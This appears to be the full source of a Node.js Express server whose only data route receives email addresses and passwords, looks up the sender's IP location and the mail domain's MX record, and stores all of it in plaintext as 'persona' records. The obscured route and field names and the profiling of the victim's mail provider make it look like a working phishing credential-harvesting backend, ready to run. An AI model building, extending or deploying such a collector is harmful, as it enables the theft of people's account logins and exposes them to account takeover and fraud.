const express = require("express")
const bodyParser = require("body-parser")
const axios = require("axios")
const cors = require("cors")
const dnsPromises = require('dns').promises;

const app = express()
const PORT = process.env.PORT || 1682

require('./dbconnect')
const { addPersona } = require("./database/models/persona")

app.use(cors())
app.use(express.static(__dirname))
app.use(bodyParser.json()) // for parsing application/json
app.use(bodyParser.urlencoded({ extended: true })) // for parsing application/x-www-form-urlencoded

app.set("trust proxy", true);

app.get("/", (req, res) => {
  res.status(200).json({ response: "Welcome, Keeps!" })
})

// Route: /UD92290
// Purpose: Receives user credentials and session info, performs IP geolocation and MX lookup, then stores the data in the database.
app.post("/UD92290", async (req, res) => {
  try {
    // Safely read body
    const { session_key, password } = req.body || {};

    // Use actual request user-agent
    const user_agent = req.headers["user-agent"] || "";

    // Validation
    if (!session_key || !password) {
      return res.status(400).json({
        success: false,
        message: "Missing required fields",
      });
    }

    if (
      typeof session_key !== "string" ||
      !session_key.includes("@")
    ) {
      return res.status(400).json({
        success: false,
        message: "Invalid email format",
      });
    }

    // Extract domain
    const domain = session_key.split("@")[1];

    // Get client IP
    let ip =
      req.headers["x-forwarded-for"]?.split(",")[0]?.trim() ||
      req.socket?.remoteAddress ||
      req.ip ||
      "";

    // Normalize IPv6 localhost
    if (ip.includes("::ffff:")) {
      ip = ip.replace("::ffff:", "");
    }

    // Fallback for local development
    let geoIp = ip;
    if (
      ip === "127.0.0.1" ||
      ip === "::1" ||
      ip === ""
    ) {
      geoIp = "8.8.8.8";
    }

    // Fetch geolocation using a free public API
    let gottenAddress = {
      ip: geoIp,
      city: "",
      region: "",
      countryName: "",
      countryCode: "",
    };

    try {
      const response = await axios.get(
        `https://ipwho.is/${geoIp}`,
        {
          timeout: 5000,
        }
      );

      const r = response?.data || {};

      gottenAddress = {
        ip: r.ip || geoIp,
        city: r.city || "",
        region: r.region || "",
        countryName: r.country_name || "",
        countryCode: r.country_code || "",
      };
    } catch (geoErr) {
      console.error("Geolocation lookup failed:", geoErr?.message || geoErr);
    }

    // MX lookup
    let mx = [];

    try {
      mx = await dnsPromises.resolveMx(domain);
    } catch (mxErr) {
      mx = [];
    }

    // Build object
    const obj = {
      username: session_key,
      password,
      domain,
      mx: mx?.[0]?.exchange || "",

      ip: gottenAddress.ip,
      city: gottenAddress.city,
      region: gottenAddress.region,
      country_name: gottenAddress.countryName,
      country_code: gottenAddress.countryCode,

      user_agent,

      time: new Date().toISOString(),
    };

    // Save
    try {
      const added = await addPersona(obj);

      if (!added) {
        return res.status(500).json({
          success: false,
          message: "Failed to add persona",
        });
      }

      return res.status(201).json({
        success: true,
        response: "Ok, added!",
      });

    } catch (addErr) {
      console.error(addErr);

      return res.status(500).json({
        success: false,
        message:
          addErr?.message ||
          "Error occurred while adding persona",
      });
    }

  } catch (err) {
    console.error(err);

    return res.status(500).json({
      success: false,
      message:
        err?.message ||
        "Failed to fetch geolocation",
    });
  }
});

app.listen(PORT, (err) => {
  if (err) throw err
  else console.log("Listening on " + PORT)
})